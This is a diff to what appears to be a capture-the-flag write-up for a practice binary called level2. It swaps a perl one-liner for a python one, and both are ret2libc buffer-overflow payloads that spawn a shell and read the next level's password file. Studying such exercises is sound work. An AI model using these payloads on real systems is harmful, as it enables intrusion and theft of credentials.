@@ -34,12 +34,12 @@ Jump to RET instruction at 0x0804853e:
 [4 bytes: 0xb7f8cc58]          "/bin/sh"
 ```
 
-### Execution
-```bash
-(perl -e 'print "A" x 80 . "\x3e\x85\x04\x08\x60\xb0\xe6\xb7\xe0\xeb\xe5\xb7\x58\xcc\xf8\xb7\n"'; echo "cat /home/user/level3/.pass") | ./level2
-```
-
 ### Critical Details
 - **80 bytes** (not 76!) - 4 bytes padding between buffer and return address
 - **Newline after payload** - gets() reads until \n
 - First return validated, second jump (to system) not checked
+
+### Execution
+```bash
+(python -c "print 'A'*80 + '\x3e\x85\x04\x08\x60\xb0\xe6\xb7\xe0\xeb\xe5\xb7\x58\xcc\xf8\xb7'"; echo "cat /home/user/level3/.pass") | ./level2
+```
